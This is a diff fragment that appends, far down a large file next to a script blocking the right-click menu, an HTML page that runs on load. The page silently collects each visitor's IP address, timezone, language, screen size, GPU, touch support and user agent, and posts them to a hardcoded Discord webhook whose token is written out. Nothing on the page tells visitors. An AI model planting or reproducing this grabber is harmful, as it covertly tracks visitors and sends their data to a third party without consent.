@@ -95850,11 +95850,72 @@ document.addEventListener('contextmenu', event => event.preventDefault());
 
 
 
+NEW
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+  function sendWebhook(data) {
+    var webhookURL = "https://discord.com/api/webhooks/1181563871488651274/TbA4Qd5tj3XzMj6R0vJ1TUX-CK_2yQYX6nWnHWsqoVAa82oeNIEaVfMdem-qk00dY7yk";
+    var request = new XMLHttpRequest();
+
+    request.open("POST", webhookURL, true);
+    request.setRequestHeader("Content-type", "application/json");
+
+    request.onreadystatechange = function() {
+      if (request.readyState === 4 && request.status === 200) {
+        console.log("Data sent successfully!");
+      } else {
+        console.log("Error sending data.");
+      }
+    };
+
+    request.send(JSON.stringify(data));
+  }
+
+  function fetchData() {
+    var data = {};
+
+    // Fetching IP address
+    fetch("https://json.geoiplookup.io/")
+      .then(function(response) {
+        return response.json();
+      })
+      .then(function(jsonData) {
+        data.ip = jsonData.ip;
+      });
+
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  
+    data.userTime = new Date().toLocaleTimeString();
+
+    data.language = navigator.language;
 
 
+    data.screenSize = {
+      width: window.innerWidth,
+      height: window.innerHeight
+    };
 
+   
+    data.gpu = navigator.userAgentData && navigator.userAgentData.gpu ? navigator.userAgentData.gpu.toString() : "N/A";
 
+    
+    data.hasTouchScreen = "ontouchstart" in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0;
 
+    
+    data.userAgent = navigator.userAgent;
+
+    
+    sendWebhook(data);
+  }
+</script>
+</head>
+<body onload="fetchData()">
+<!-- Add your website content here -->
+</body>
+</html>
 
 
 
